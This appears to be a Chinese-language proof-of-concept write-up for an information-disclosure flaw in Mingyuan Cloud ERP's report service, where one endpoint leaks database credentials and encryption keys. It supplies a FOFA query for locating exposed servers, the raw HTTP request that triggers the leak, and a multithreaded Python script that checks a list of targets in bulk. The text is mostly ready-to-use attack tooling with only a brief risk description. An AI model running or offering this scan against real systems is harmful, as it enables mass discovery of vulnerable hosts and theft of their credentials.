# 明源云ERP报表服务GetErpConfig存在信息泄露漏洞

在访问 /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 路径时，返回了包含敏感信息的响应。这些信息包括但不限于数据库连接字符串、用户名、密码、加密密钥等。这些敏感信息的暴露可能导致以下风险：数据库访问风险：攻击者可以利用数据库连接字符串中的用户名和密码直接访问数据库，从而获取或篡改敏感数据。加密风险：攻击者可以利用加密密钥解密或篡改加密数据，导致数据泄露或数据完整性受损。系统管理风险：攻击者可以利用管理员用户代码进行系统管理操作，进一步扩大攻击范围。

fofa:

```
body="报表服务已正常运行"
```

poc:

```
GET /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```

批量检测脚本:

```
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from urllib.parse import urlparse

def is_valid_url(url):
    """检查 URL 是否有效"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def add_protocol(url):
    """为 URL 添加 HTTP 协议头"""
    if not url.startswith('http'):
        return 'http://' + url
    return url

def test_vulnerability(url):
    """测试 URL 是否存在漏洞"""
    full_url = f"{url}/service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60"
    
    try:
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200:
            print(f"[+] 可能存在的漏洞url: {url}")
        else:
            print(f" Not vulnerable: {url} (Status Code: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f" Error testing {url}: {str(e)}")

def main():
    urls = []
    with open("url.txt", "r") as file:
        for line in file:
            url = line.strip()
            if is_valid_url(url):
                urls.append(url)
            else:
                # 尝试修复 URL
                fixed_url = add_protocol(url)
                if is_valid_url(fixed_url):
                    urls.append(fixed_url)
                else:
                    print(f"[-] Invalid URL: {url}")

    # 使用线程池执行任务
    max_workers = 10  # 可以根据系统资源调整线程数量
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_vulnerability, url): url for url in urls}
        
        for future in as_completed(futures):
            url = futures[future]
            try:
                data = future.result()
            except Exception as exc:
                print(f" Error occurred while testing {url}: {exc}")

if __name__ == "__main__":
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"\n--- Total time taken: {end_time - start_time:.2f} seconds ---")
```

使用方法:

```
python poc.py
同目录下保存一个url.txt
```











